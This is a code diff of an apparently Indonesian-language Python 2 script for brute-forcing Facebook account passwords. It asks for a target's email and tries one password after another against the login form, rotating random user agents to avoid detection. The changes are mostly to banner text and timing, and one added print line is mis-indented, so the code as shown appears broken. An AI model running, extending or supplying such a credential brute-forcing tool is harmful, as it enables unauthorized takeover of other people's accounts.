@@ -40,15 +40,15 @@ def cover():
     
     
      """
-    runntek(BB+"           Memasuki system BRUTEFORCEF8. . ...")
-    time.sleep(2)
+    runntek(BB+"          ███████████████  OSIF...F8 MODULE. . ...")
+    time.sleep(1)
     print " "
     print RR+"  +============================================+"
     print RR+"  | PROGRAM PENGEMBANGAN SYSTEM KEAMANAN M3DPR0|"
     print RR+"  +============================================+"
     print RR+"  |         SCRIPT     : File OSIF             |"
     print RR+"  |         REPOSTORY  : SAN-Brother           |"
-    print RR+"  |         CODER	     : Susanto               |"
+    print RR+"  |         CODER	     : Susanto              |"
     print RR+"  |         PROGRAM    : Versi.1.0.1           |"
     print RR+"  |--------------------------------------------|"
     print RR+"  |     OPEN SOURC INFORMATION FACEBOOK F8     |"
@@ -56,7 +56,7 @@ def cover():
     print RR+"  +============================================+" 
 
 
-cover()
+######
 
 email = str(raw_input(BB+"Target Crack... \033[33;1m: "))
 
@@ -108,7 +108,7 @@ def kol():
         exit(0)
 def brute(password):
         sys.stdout.write(RR+"\r[+]\033[97;1m Mencoba... {}\n".format(password))
-        sys.stdout.flush(RR+"\r[x]\033[97;1m Salah... {}\n")
+        sys.stdout.flush()
         br.addheaders = [('User-agent', random.choice(useragents))]
         site = br.open(login)
         br.select_form(nr = 0)
@@ -142,6 +142,8 @@ def welcome():
         print GL+" [*] Crack Akun : {}".format(email)
         print RR+" [*] Password Terbaca :" , len(total),WW+ "passwords"
 	print " "
+	        print " "
+        runntek(RR+" █████████████ ")
 	runntek(RR+" Sedang memulai ...")
         time.sleep(1)
 
